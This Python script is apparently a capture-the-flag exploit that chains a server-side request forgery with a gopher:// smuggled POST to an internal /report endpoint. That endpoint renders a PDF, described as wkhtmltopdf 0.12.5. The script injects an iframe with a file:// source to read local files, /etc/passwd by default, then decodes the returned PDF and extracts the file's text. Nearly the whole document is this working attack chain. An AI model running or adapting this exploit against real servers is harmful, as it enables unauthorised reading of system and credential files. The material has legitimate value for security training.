#!/usr/bin/env python3
"""wkhtmltopdf 0.12.5 local file read through the smuggled POST /report.

0.12.5 still allows local file access when the page comes from stdin, so an
<iframe src="file:///..."> in `content` pulls the file into the rendered PDF.
The station returns the document base64 in JSON, and the console's tape echoes the
whole raw response, so the chain is:

  feed=gopher://127.0.0.1:8000/_<POST /report ...>  ->  JSON  ->  base64  ->  PDF
  -> inflate every FlateDecode stream -> pull out text-showing operators.

Qt embeds subset fonts, so the glyphs can be 8-bit (readable) or 16-bit Identity-H
(need the ToUnicode CMap); the extractor prints what it finds either way.
"""
import base64
import html as H
import json
import re
import string
import sys
import time
import urllib.parse
import zlib

import gopher
import ssrf


def tape_of(feed, timeout=60):
    st, pg = ssrf.get("/", feed=feed, timeout=timeout)
    b = (re.search(r"bytes=(\S+?)\s*-->", pg) or [None, "?"])[1]
    t = re.search(r'<pre class="tape">(.*?)</pre>', pg, re.S)
    raw = H.unescape(urllib.parse.unquote(t.group(1))) if t else ""
    return st, b, raw


def report(content, title=None):
    body = "content=" + content
    if title:
        body += "&title=" + title
    feed = gopher.gopher_raw("POST", "/report", body,
                             ["Content-Type: application/x-www-form-urlencoded"])
    st, b, raw = tape_of(feed)
    w("%-52s http=%s bytes=%s len(tape)=%s" % ((content[:50]), st, b, len(raw)))
    head, _, rest = raw.partition("\r\n\r\n")
    if not rest:
        w("   no body; head=%r" % head[:120])
        return None
    try:
        obj = json.loads(rest)
    except Exception as ex:
        w("   body not JSON (%s): %r" % (ex, rest[:160]))
        return None
    w("   json keys=%s document=%r bytes=%r" % (sorted(obj), obj.get("document"),
                                                obj.get("bytes")))
    return obj


def w(s):
    sys.stdout.buffer.write((str(s) + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


def pdf_text(data):
    out = []
    for m in re.finditer(rb"stream\r?\n?(.*?)endstream", data, re.S):
        blob = m.group(1)
        try:
            raw = zlib.decompress(blob)
        except Exception:
            raw = blob
        for tm in re.finditer(rb"\((?:[^()\\]|\\.)*\)\s*Tj|\[((?:[^\[\]]|\[[^\]]*\])*)\]\s*TJ",
                              raw, re.S):
            out.append(tm.group(0))
    return out


def show_strings(blob, minlen=4):
    """Print runs of printable chars, which is how flag text usually surfaces."""
    keep = set(string.printable[:95].encode())
    runs, cur = [], bytearray()
    for ch in blob:
        if ch in keep:
            cur.append(ch)
        else:
            if len(cur) >= minlen:
                runs.append(bytes(cur))
            cur = bytearray()
    if len(cur) >= minlen:
        runs.append(bytes(cur))
    return [r for r in runs if not re.fullmatch(rb"[a-zA-Z]{4,6}", r) or b"sun" in r.lower()]


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "/etc/passwd"
    obj = report('<iframe src="file://%s"></iframe>' % target)
    if not obj or "data" not in obj:
        sys.exit("no document returned")
    pdf = base64.b64decode(obj["data"])
    open("../files/lfi_%s.pdf" % re.sub(r"\W+", "_", target), "wb").write(pdf)
    w("pdf=%d bytes, header=%r" % (len(pdf), pdf[:8]))
    text = b"".join(pdf_text(pdf))
    w("text operators: %d bytes" % len(text))
    for s in show_strings(text)[:40]:
        w("   T: %r" % s[:120])
    for s in show_strings(pdf)[:20]:
        w("   P: %r" % s[:120])
